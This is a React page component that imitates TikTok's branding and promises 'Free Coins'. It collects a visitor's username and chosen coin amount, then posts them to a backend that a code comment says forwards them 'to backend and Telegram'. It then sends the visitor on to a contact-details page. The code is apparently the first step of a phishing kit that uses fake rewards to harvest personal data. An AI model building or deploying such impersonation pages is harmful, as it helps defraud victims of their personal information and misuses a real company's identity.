import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const HomePage = () => {
  const navigate = useNavigate();
  const [username, setUsername] = useState('');
  const [selectedCoin, setSelectedCoin] = useState(100000);
  const [sessionId, setSessionId] = useState(null);

  useEffect(() => {
    // Create session on mount
    const createSession = async () => {
      try {
        const response = await axios.post(`${API}/session/create`);
        const newSessionId = response.data.session_id;
        setSessionId(newSessionId);
        localStorage.setItem('sessionId', newSessionId);
      } catch (error) {
        console.error('Failed to create session:', error);
      }
    };
    createSession();
  }, []);

  const coinOptions = [
    { value: 25000, label: '25,000' },
    { value: 50000, label: '50,000' },
    { value: 100000, label: '100,000' }
  ];

  const handleContinue = async () => {
    if (username.trim() && sessionId) {
      // Save to localStorage
      localStorage.setItem('username', username);
      localStorage.setItem('coinAmount', selectedCoin);

      // Send to backend and Telegram
      try {
        await axios.post(`${API}/session/step`, {
          session_id: sessionId,
          step: 'username_coin',
          data: {
            username: username,
            amount: selectedCoin
          }
        });
      } catch (error) {
        console.error('Failed to submit step:', error);
      }

      // Navigate directly to contact page
      navigate('/contact');
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0a0a0b] via-[#121214] to-[#0a0a0b]">
      {/* Header */}
      <header className="flex items-center justify-between px-6 py-4 bg-[#0f0f10] border-b border-gray-800">
        <div className="flex items-center gap-3">
          <span className="text-white text-2xl font-bold tracking-tight">TikTok</span>
          <div className="flex gap-1.5">
            <div className="w-2 h-2 rounded-full bg-pink-500"></div>
            <div className="w-2 h-2 rounded-full bg-cyan-400"></div>
          </div>
          <div className="ml-2">
            <div className="text-white text-sm font-semibold">Creator</div>
            <div className="text-white text-sm font-semibold">Marketplace</div>
          </div>
        </div>
        <Button className="bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold px-8 py-2 rounded-md transition-all">
          Login
        </Button>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-6 py-12">
        {/* Title */}
        <div className="text-center mb-12">
          <h1 className="text-6xl font-black mb-4">
            <span className="bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 bg-clip-text text-transparent">
              TikTok
            </span>
          </h1>
          <p className="text-cyan-400 text-2xl font-semibold">Get Free Coins</p>
        </div>

        {/* Instructions */}
        <p className="text-gray-400 text-center text-lg mb-8">
          Enter your TikTok username and choose a coin amount.
        </p>

        {/* Username Input */}
        <div className="mb-8">
          <label className="text-white text-lg mb-3 block">Username</label>
          <Input
            type="text"
            placeholder="@username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full bg-[#1a1a1c] border border-gray-700 text-white placeholder:text-gray-500 px-4 py-6 text-lg rounded-lg focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400"
          />
        </div>

        {/* Coin Selection */}
        <div className="mb-8">
          <label className="text-white text-lg mb-4 block">Select Coin Amount</label>
          <div className="grid grid-cols-3 gap-4">
            {coinOptions.map((option) => (
              <button
                key={option.value}
                onClick={() => setSelectedCoin(option.value)}
                className={`flex items-center justify-center gap-3 p-6 rounded-xl border-2 transition-all ${
                  selectedCoin === option.value
                    ? 'bg-[#1a1a1c] border-cyan-400 shadow-lg shadow-cyan-400/20'
                    : 'bg-[#1a1a1c] border-gray-700 hover:border-gray-600'
                }`}
              >
                <div className="w-8 h-8 rounded-full bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center">
                  <div className="w-6 h-6 rounded-full border-2 border-yellow-200"></div>
                </div>
                <span className="text-white text-2xl font-bold">{option.label}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Continue Button */}
        <Button
          onClick={handleContinue}
          disabled={!username.trim()}
          className="w-full bg-gradient-to-r from-[#1a1a1c] to-[#2a2a2c] hover:from-[#2a2a2c] hover:to-[#1a1a1c] text-gray-400 hover:text-white font-semibold py-6 text-lg rounded-lg border border-gray-700 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
        >
          Continue
        </Button>

        {/* Coins Display */}
        <div className="mt-8 text-center">
          <div className="inline-block bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-8 py-4">
            <span className="text-gray-400 text-lg">You will receive: </span>
            <span className="text-cyan-400 text-2xl font-bold">{selectedCoin.toLocaleString()}</span>
            <span className="text-gray-400 text-lg"> Coins</span>
          </div>
        </div>
      </main>
    </div>
  );
};

export default HomePage;